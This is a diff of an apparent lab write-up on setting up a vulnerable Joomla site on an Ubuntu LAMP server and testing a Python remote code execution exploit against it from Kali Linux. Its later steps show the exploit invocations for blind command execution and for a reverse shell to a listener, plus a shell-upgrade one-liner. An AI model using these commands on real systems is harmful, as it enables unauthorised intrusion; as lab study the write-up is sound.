@@ -25,7 +25,7 @@ The steps I took as follows,
 Using “sudo apt-get install mysql-server mysql-client” command and providing with required root username and password to the root user of SQL.
 
 2. Install Apache2
-Using “sudo apt-get install apache2” command and tested using “http://<ubuntu ip>”
+Using “sudo apt-get install apache2” command and tested using “http://ubuntu ip”
 
 3. Install PHP5 
 Using “sudo apt-get install php5 libapache2-mod-php5” after that restarting the apache service using “service apache2 restart”
@@ -37,7 +37,7 @@ Restarted my apache service again to apply changes.
 
 5. Install phpMyAdmin
 Installed phpMyAdmin using “sudo apt-get install phpmyadmin” and provided necessary parameters required when installing. 
-Tested with “http://<ubuntu ip>/phpmyadmin/”
+Tested with “http://ubuntu ip/phpmyadmin/”
   
 After installing and configuring LAMP in my ubuntu server, I moved on with my Joomla configuration. 
 The steps I took as follows, 
@@ -55,10 +55,10 @@ I downloaded the vulnerable application from exploit-db. (https://www.exploit-db
 Gave the required permissions.
 1. chown -R www-data.www-data /var/www/html/joomla
 2. chmod -R 755 /var/www/html/joomla   
-Test the configurations using “http://<ubuntu ip>/joomla”
+Test the configurations using “http://ubuntu ip/joomla”
 
 3. Configure Joomla and host a test website. 
-Went to the above URL (http://<ubuntu ip>/joomla) and provided with necessary details and proceed to next page by clicking “Next” button. And there also provided the necessary details. Finally, I successfully hosted my test website.
+Went to the above URL (http://ubuntu ip/joomla) and provided with necessary details and proceed to next page by clicking “Next” button. And there also provided the necessary details. Finally, I successfully hosted my test website.
 ![1](https://user-images.githubusercontent.com/37071700/81484636-b9371080-9264-11ea-8556-b562397e11a4.png)<br><br>
 
 # The Python exploit.   
@@ -118,14 +118,14 @@ I tryout this exploit using a Kali Linux Version 2020.1 and following are the st
 ![9](https://user-images.githubusercontent.com/37071700/81484992-b38efa00-9267-11ea-970b-72121cfddc60.png)<br><br>
 ![10](https://user-images.githubusercontent.com/37071700/81485010-c7d2f700-9267-11ea-8acf-bf9f759b14f3.png)<br><br>
 2. Fire up the terminal and test the Remote Code Execution (RCE) exploitation.<br><br>
-By typing “python <exploit>.py -t http://<ubuntu ip>/ --cmd” we can get a shell-like environment to perform blind remote code   execution.
+By typing “python <exploit>.py -t http://ubuntu ip/ --cmd” we can get a shell-like environment to perform blind remote code   execution.
   ![11](https://user-images.githubusercontent.com/37071700/81485049-17192780-9268-11ea-9c9e-77610dfc1144.png)<br><br>
   
 In the above image you can see that I receive an HTTP/1.1 response saying that <Response [200]><br>
 Response 200 is a HTTP/1.1 response which states that the request has succeeded.<br> 
 (Ref : https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html)<br><br>
 3. Next test, the reverse shell exploitation.<br><br> 
-By typing “python <exploit>.py -t http://<ubuntu ip>/ -l <localhost> -p <port>” we can get a reverse shell separately in another terminal. I used python -c "import pty;pty.spawn('/bin/bash')" to get the shell and tested with pwd command.
+By typing “python <exploit>.py -t http://ubuntu ip/ -l <localhost> -p <port>” we can get a reverse shell separately in another terminal. I used python -c "import pty;pty.spawn('/bin/bash')" to get the shell and tested with pwd command.
   ![12](https://user-images.githubusercontent.com/37071700/81485141-8abb3480-9268-11ea-9107-43b8da283e18.png)<br><br>
   ![13](https://user-images.githubusercontent.com/37071700/81485150-8d1d8e80-9268-11ea-8251-2251af52f91a.png)<br><br>
 
